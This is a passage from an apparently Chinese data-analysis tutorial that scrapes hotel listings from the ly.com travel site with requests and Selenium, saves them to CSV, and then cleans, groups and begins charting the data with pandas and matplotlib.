class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># print(headers_dict)</span>hotel_name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>address_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shangquan_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>rate_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>comment_conut_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>leixing_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>commentMainTag_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://www.ly.com/tapi/v2/list?pageSize=20&amp;t=1694239311116&amp;city=321&amp;inDate=2023-09-09&amp;outDate=2023-09-10&amp;filterList=8888_1&amp;pageIndex='</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'&amp;sugActInfo='</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers_dict<span class="token punctuation">)</span>    res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    hotel_list <span class="token operator">=</span> res_json<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'hotelList'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> hotel <span class="token keyword">in</span> hotel_list<span class="token punctuation">:</span>        hotelName <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'hotelName'</span><span class="token punctuation">]</span>        hotel_name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hotelName<span class="token punctuation">)</span>        hotelAddress <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'hotelAddress'</span><span class="token punctuation">]</span>        address_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hotelAddress<span class="token punctuation">)</span>        areaName <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'areaName'</span><span class="token punctuation">]</span>        shangquan_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>areaName<span class="token punctuation">)</span>        commentScore <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'commentScore'</span><span class="token punctuation">]</span>        rate_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>commentScore<span class="token punctuation">)</span>        commentCount <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'commentCount'</span><span class="token punctuation">]</span>        comment_conut_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>commentCount<span class="token punctuation">)</span>        starLevelDes <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'starLevelDes'</span><span class="token punctuation">]</span>        leixing_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>starLevelDes<span class="token punctuation">)</span>        commentMainTag <span class="token operator">=</span> hotel<span class="token punctuation">[</span><span class="token string">'commentMainTag'</span><span class="token punctuation">]</span>        commentMainTag_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>commentMainTag<span class="token punctuation">)</span>hotel_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>hotel_dict<span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hotel_name_listhotel_dict<span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span> <span class="token operator">=</span> address_listhotel_dict<span class="token punctuation">[</span><span class="token string">'shangquan'</span><span class="token punctuation">]</span> <span class="token operator">=</span> shangquan_listhotel_dict<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rate_listhotel_dict<span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span> <span class="token operator">=</span> comment_conut_listhotel_dict<span class="token punctuation">[</span><span class="token string">'leixing'</span><span class="token punctuation">]</span> <span class="token operator">=</span> leixing_listhotel_dict<span class="token punctuation">[</span><span class="token string">'commentMainTag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> commentMainTag_list<span class="token comment"># print(hotel_dict)</span>df1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> hotel_dict<span class="token punctuation">)</span>df1<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel_new.csv'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span>  webdriver <span class="token comment"># 从selenium库中调用webdriver模块</span><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">import</span> time<span class="token punctuation">,</span>redriver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.ly.com/hotel/hotellist?pageSize=20&amp;t=1693792521684&amp;city=321&amp;inDate=2023-09-04&amp;outDate=2023-09-05&amp;filterList=8888_1'</span><span class="token punctuation">)</span> <span class="token comment"># 访问页面</span>hotel_name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>address_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shangquan_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>rate_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>comment_conut_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>leixing_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment"># 暂停，等待浏览器缓冲</span>    element <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>LINK_TEXT<span class="token punctuation">,</span><span class="token string">'下一页'</span><span class="token punctuation">)</span>    element<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 酒店名</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'class="name"&gt;(.*?)&lt;/span&gt;'</span><span class="token punctuation">)</span>    hotel_name<span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    hotel_name_list <span class="token operator">+=</span> hotel_name    <span class="token comment"># 地址 &lt;p data-v-883905b8="" class="position"&gt;&lt;span data-v-883905b8=""&gt;东方路8号&lt;!----&gt;&lt;/span&gt;&lt;!----&gt;</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;p data-v-883905b8="" class="position"&gt;&lt;span data-v-883905b8=""&gt;(.*?)&lt;!----&gt;&lt;/span&gt;&lt;!----&gt;'</span><span class="token punctuation">)</span>    address <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    address_list <span class="token operator">+=</span> address    <span class="token comment"># 商圈 &lt;span data-v-883905b8="" style="color: rgb(255, 136, 0); margin-left: 5px;"&gt;近浦东大道地铁站  ·  浦东陆家嘴金融贸易区&lt;/span&gt;</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'margin-left: 5px;"&gt;(.*?)&lt;/span&gt;'</span><span class="token punctuation">)</span>    shangquan <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    shangquan_list <span class="token operator">+=</span> shangquan    <span class="token comment"># 评分&lt;p data-v-883905b8="" class="score mb5"&gt;&lt;em data-v-883905b8=""&gt;4.7&lt;/em&gt; 很好 &lt;/p&gt;</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;p data-v-883905b8="" class="score mb5"&gt;&lt;em data-v-883905b8=""&gt;(.*?)&lt;/em&gt;'</span><span class="token punctuation">)</span>    rate <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    rate_list <span class="token operator">+=</span> rate    <span class="token comment"># 评论数&lt;p data-v-883905b8="" class="comment mb10"&gt;共3001条点评&lt;/p&gt;</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;p data-v-883905b8="" class="comment mb10"&gt;(.*?)&lt;/p&gt;'</span><span class="token punctuation">)</span>    comment_conut <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    comment_conut_list <span class="token operator">+=</span> comment_conut    <span class="token comment"># 类型，&lt;em data-v-883905b8="" class="starLevelStr"&gt;高档型&lt;/em&gt;</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;em data-v-883905b8="" class="starLevelStr"&gt;(.*?)&lt;/em&gt;'</span><span class="token punctuation">)</span>    leixing <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>driver<span class="token punctuation">.</span>page_source<span class="token punctuation">)</span>    leixing_list <span class="token operator">+=</span> leixing<span class="token keyword">print</span><span class="token punctuation">(</span>hotel_name_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>hotel_name_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>address_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>address_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>shangquan_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shangquan_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rate_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rate_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>comment_conut_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>comment_conut_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>leixing_list<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>leixing_list<span class="token punctuation">)</span><span class="token punctuation">)</span>hotel_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>hotel_dict<span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hotel_name_listhotel_dict<span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span> <span class="token operator">=</span> address_listhotel_dict<span class="token punctuation">[</span><span class="token string">'shangquan'</span><span class="token punctuation">]</span> <span class="token operator">=</span> shangquan_listhotel_dict<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rate_listhotel_dict<span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span> <span class="token operator">=</span> comment_conut_listhotel_dict<span class="token punctuation">[</span><span class="token string">'leixing'</span><span class="token punctuation">]</span> <span class="token operator">=</span> leixing_listdf1 <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span>data <span class="token operator">=</span> hotel_dict<span class="token punctuation">)</span>df1<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子任务一-：商圈字段处理"><a href="#子任务一-：商圈字段处理" class="headerlink" title="子任务一+：商圈字段处理"></a>子任务一+：商圈字段处理</h2><h3 id="子任务二：数据处理"><a href="#子任务二：数据处理" class="headerlink" title="子任务二：数据处理"></a>子任务二：数据处理</h3><p>先读取文件，因为我们的数据中没有缺失的，手动制造一点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>删除hotel.csv中酒店名称为空的数据并且存入hotel2_c1.csv；打印出被删除的数据。</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 删除hotel.csv中酒店名称为空的数据并且存入hotel2_c1.csv；</span><span class="token comment"># inplace=True可以删除原数据</span><span class="token comment"># how='any'是删除有任意字段为空的行或者列</span><span class="token comment"># axis=0表示删除行</span>df1 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>subset<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"hotel_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 记得index要设为False，不然又会生成一个新的index</span><span class="token comment"># mode可以设置追加或者覆盖等等</span>df1<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel2_c1.csv'</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment"># 打印出被删除的数据。</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除hotel2.csv中删除数据源中缺失值大于3个字段的数据记录并且存入hotel2_c2.csv；</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 删除hotel2.csv中删除数据源中缺失值大于3个字段的数据记录并且存入hotel2_c2.csv；</span><span class="token comment"># thresh参数用于指定每行（或每列）至少需要具有非空值的数量</span><span class="token comment"># thresh参数接受一个整数值，表示允许的最小非空值数量。</span><span class="token comment"># 如果行（或列）中的非空值数量低于thresh值，则该行（或列）将被删除。</span><span class="token comment"># df.shape[1]返回DataFrame的列数</span>df2 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>thresh<span class="token operator">=</span><span class="token builtin">file</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span>df2<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel2_c2.csv'</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment"># 打印出被删除的数据。</span><span class="token comment"># any()返回的是一个布尔值，只有行/列有空值，即为True</span><span class="token comment"># sum()则可以返回该行/列具体有几个空值</span>deleted_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>deleted_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>将hotel2.csv中评分为空的数据设置为0并且存入hotel2_c3.csv；</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将hotel2.csv中评分为空的数据设置为0并且存入hotel2_c3.csv；</span><span class="token comment"># 注意fillna是不能通过subset去指定列</span>df3 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 注意：这里不要动原数据，但是不要直接赋值，直接赋值是引用</span><span class="token comment"># 以下方法二选一，推荐inplace</span><span class="token comment"># df3['rate'] = df3['rate'].fillna(0)</span>df3<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>inplace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>df3<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel2_c3.csv'</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment"># 打印出被改变的数据</span>deleted_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>deleted_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>将hotel2.csv中评分为空的数据设置为平均评分并且存入hotel2_c4.csv。</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">rate_mean <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>describe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'mean'</span><span class="token punctuation">,</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token comment"># 将hotel2.csv中评分为空的数据设置为0并且存入hotel2_c3.csv；</span><span class="token comment"># 注意fillna是不能通过subset去指定列</span>df3 <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 注意：这里不要动原数据，但是不要直接赋值，直接赋值是引用</span><span class="token comment"># 以下方法二选一，推荐inplace</span><span class="token comment"># df3['rate'] = df3['rate'].fillna(0)</span>df3<span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>fillna<span class="token punctuation">(</span>rate_mean<span class="token punctuation">,</span>inplace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>df3<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'hotel2_c4.csv'</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token comment"># 打印出被改变的数据</span>deleted_data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># print(deleted_data)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="任务B：数据分析与可视化"><a href="#任务B：数据分析与可视化" class="headerlink" title="任务B：数据分析与可视化"></a>任务B：数据分析与可视化</h2><h3 id="子任务一：数据分析"><a href="#子任务一：数据分析" class="headerlink" title="子任务一：数据分析"></a>子任务一：数据分析</h3><p>城市游客接纳能力是城市规划建设中的重要指标，其中城市的酒店房间数量是城市游客接纳能力的关键要素。请编写程序或脚本根据酒店管理网站中的数据hotel.csv统计以下的相关信息，具体要求如下：</p><p>1、 酒店一共有几种档次，分别统计其酒店总数；统计各种档次酒店的平均评分和总的评论数。(如果数据中有缺失则填充为0)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token builtin">file</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token comment"># 酒店总数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、 统计各种档次酒店的平均评分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 各种档次酒店的平均评分</span>rate_mean <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rate_mean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、 统计各种档次酒店的总的评论数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 总的评论数</span><span class="token comment"># 先把缺失数据弄成0</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token string">'共0条'</span><span class="token punctuation">)</span><span class="token comment"># 然后处理数据为整数类型</span>pattern <span class="token operator">=</span> <span class="token string">r'共(.*?)条'</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">str</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment"># 统计</span>comment_count_mean <span class="token operator">=</span> DataFrame<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'leixing'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'comment_conut'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>comment_count_mean<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子任务二：数据可视化"><a href="#子任务二：数据可视化" class="headerlink" title="子任务二：数据可视化"></a>子任务二：数据可视化</h3><p>在企业消费平台上，各地区的酒店信息能够反映一个地区商业活动的密集程度。例如酒店总量多的城市大都具有强烈的吸纳外来人员的能力，订单数量能够反映该地区的有较多的商业往来。根据现有数据及给定参数完成酒店数据统计。</p><p>使用Python代码编写数据可视化的相关功能，数据分析业务所用数据为hotel.csv数据，具体要求如下：</p><p>1、 用柱状图显示各类档次的酒店总数；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">file</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'hotel.csv'</span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'hotel_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token builtin">file</span><span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token builtin">file</span><span class="token punctuation">[</span><span class="token string">'rate'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>nan<span class="token comment"># 指定字体为SimHei</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span><span class="token comment"># 酒店总数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>groupby<span class="token 